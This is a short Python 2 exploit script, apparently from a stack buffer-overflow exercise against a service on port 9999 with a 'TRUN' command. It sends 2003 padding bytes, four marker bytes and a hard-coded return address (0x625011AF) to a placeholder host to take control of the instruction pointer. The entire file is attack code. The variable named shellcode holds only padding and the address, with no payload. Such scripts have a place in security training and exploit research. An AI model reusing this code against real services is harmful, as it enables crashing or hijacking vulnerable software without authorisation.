#!/usr/bin/python2
import sys, socket

# 625011AF

shellcode = "A" * 2003 + "B" * 4 + "\xaf\x11\x50\x62"

try:
    print "\nControlling EIP..."
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("x.x.x.x", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:            
    print "\nError Connecting to Server"
    sys.exit()
